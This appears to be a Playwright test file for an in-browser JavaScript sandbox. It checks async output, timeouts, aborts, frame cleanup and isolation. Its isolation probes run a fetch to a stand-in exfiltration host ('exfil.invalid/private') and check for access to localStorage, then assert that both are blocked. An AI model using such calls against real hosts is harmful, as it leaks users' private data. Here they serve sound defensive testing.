import assert from 'node:assert/strict';
import { readFile } from 'node:fs/promises';
import ts from 'typescript';
import { chromium } from 'playwright';

const browser = await chromium.launch({ channel: 'chrome', headless: true });
try {
  const page = await browser.newPage();
  let outgoing = 0;
  await page.route('http://sandbox.test/**', route => route.fulfill({ contentType: 'text/html', body: '<!doctype html><title>Host document</title>' }));
  await page.route('https://exfil.invalid/**', route => { outgoing++; return route.abort(); });
  await page.goto('http://sandbox.test/');
  await page.evaluate(() => localStorage.setItem('private-marker', 'host-only'));
  const source = await readFile('src/lib/browser-code-sandbox.ts', 'utf8');
  const script = ts.transpileModule(source, { compilerOptions: { target: ts.ScriptTarget.ES2020, module: ts.ModuleKind.ESNext } }).outputText.replace(/^export /gm, '');
  await page.addScriptTag({ content: script + ';window.runSandbox = runJavaScriptSandbox;' });
  const result = await page.evaluate(() => window.runSandbox('console.log("answer", refData.value + 2)', { value: 40 }));
  assert.equal(result.error, null, JSON.stringify(result));
  assert.deepEqual(result.output, ['answer 42']);
  const delayed = await page.evaluate(() => window.runSandbox('console.log("SYNC-OK"); setTimeout(function(){ console.log("ASYNC-OK"); }, 600);'));
  assert.equal(delayed.error, null, JSON.stringify(delayed));
  assert.deepEqual(delayed.output, ['SYNC-OK', 'ASYNC-OK']);
  const asyncCases = [
    ['Promise chain', 'Promise.resolve().then(() => 42).then(value => console.log(value));', ['42']],
    ['timer-backed Promise.then', 'new Promise(resolve => setTimeout(resolve, 40)).then(() => console.log("THEN-OK"));', ['THEN-OK']],
    ['top-level await', 'await new Promise(resolve => setTimeout(resolve, 40)); console.log("AWAIT-OK");', ['AWAIT-OK']],
    ['detached async function', '(async () => { await new Promise(resolve => setTimeout(resolve, 40)); console.log("DETACHED-OK"); })();', ['DETACHED-OK']],
    ['nested tasks', 'setTimeout(() => Promise.resolve().then(() => setTimeout(() => console.log("NESTED-OK"), 40)), 10);', ['NESTED-OK']],
    ['async timer callback', 'setTimeout(async () => { await new Promise(resolve => setTimeout(resolve, 40)); console.log("CALLBACK-OK"); }, 10);', ['CALLBACK-OK']],
    ['interval clears itself', 'let n = 0; const id = setInterval(() => { console.log(++n); if (n === 2) clearInterval(id); }, 20);', ['1', '2']],
    ['cancelled timer', 'const id = setTimeout(() => console.log("WRONG"), 9999); clearTimeout(id); console.log("CANCELLED");', ['CANCELLED']],
    ['global timer and console', 'globalThis.setTimeout(() => globalThis.console.log("GLOBAL-OK"), 20);', ['GLOBAL-OK']],
  ];
  for (const [name, code, output] of asyncCases) {
    const actual = await page.evaluate(code => window.runSandbox(code), code);
    assert.equal(actual.error, null, `${name}: ${JSON.stringify(actual)}`);
    assert.deepEqual(actual.output, output, name);
  }
  for (const code of [
    'console.log("BEFORE-ERROR"); setTimeout(() => { throw new Error("ASYNC-FAIL"); }, 20);',
    'console.log("BEFORE-ERROR"); setTimeout(async () => { throw new Error("ASYNC-FAIL"); }, 20);',
    'console.log("BEFORE-ERROR"); Promise.reject(new Error("ASYNC-FAIL"));',
    'console.log("BEFORE-ERROR"); queueMicrotask(() => { throw new Error("ASYNC-FAIL"); });',
  ]) {
    const actual = await page.evaluate(code => window.runSandbox(code), code);
    assert.match(actual.error, /ASYNC-FAIL/, code);
    assert.deepEqual(actual.output, ['BEFORE-ERROR']);
  }
  const pending = await page.evaluate(async () => {
    const updates = [];
    const result = await window.runSandbox('console.log("BEFORE-TIMEOUT"); setInterval(() => {}, 20);', {}, { timeoutMs: 500, onOutput: output => updates.push(output) });
    return { result, updates };
  });
  assert.match(pending.result.error, /超时/);
  assert.deepEqual(pending.result.output, ['BEFORE-TIMEOUT']);
  assert.deepEqual(pending.updates, [['BEFORE-TIMEOUT']]);
  const aborted = await page.evaluate(async () => {
    const controller = new AbortController();
    return window.runSandbox('console.log("BEFORE-ABORT"); setTimeout(() => console.log("TOO-LATE"), 2000);', {}, { signal: controller.signal, onOutput: () => controller.abort() });
  });
  assert.match(aborted.error, /停止/);
  assert.deepEqual(aborted.output, ['BEFORE-ABORT']);
  assert.equal(await page.locator('iframe').count(), 0, 'Disposable frames must be removed');
  const probe = await page.evaluate(() => window.runSandbox(`console.log(typeof window, typeof document, typeof localStorage); try { await fetch('https://exfil.invalid/private'); } catch { console.log('NETWORK_BLOCKED'); }`));
  assert.equal(probe.error, null, JSON.stringify(probe));
  assert.deepEqual(probe.output, ['undefined undefined undefined', 'NETWORK_BLOCKED']);
  assert.equal(await page.title(), 'Host document');
  assert.equal(await page.evaluate(() => localStorage.getItem('private-marker')), 'host-only');
  assert.equal(outgoing, 0);
  const detachedFetch = await page.evaluate(() => window.runSandbox("fetch('https://exfil.invalid/private').then(() => console.log('WRONG')).catch(() => console.log('FETCH-REJECTION-OBSERVED'));"));
  assert.equal(detachedFetch.error, null, JSON.stringify(detachedFetch));
  assert.deepEqual(detachedFetch.output, ['FETCH-REJECTION-OBSERVED']);
  assert.equal(outgoing, 0);
  const loop = await page.evaluate(() => window.runSandbox('while(true) {}', {}, { timeoutMs: 500 }));
  assert.match(loop.error, /超时/);
  const after = await page.evaluate(() => window.runSandbox('console.log("still works")'));
  assert.deepEqual(after.output, ['still works']);
  console.log('PASS browser sandbox: delayed output, Promise/await, nested tasks, intervals, cancellation, async errors, partial output, timeout, isolation and recovery');
} finally { await browser.close(); }
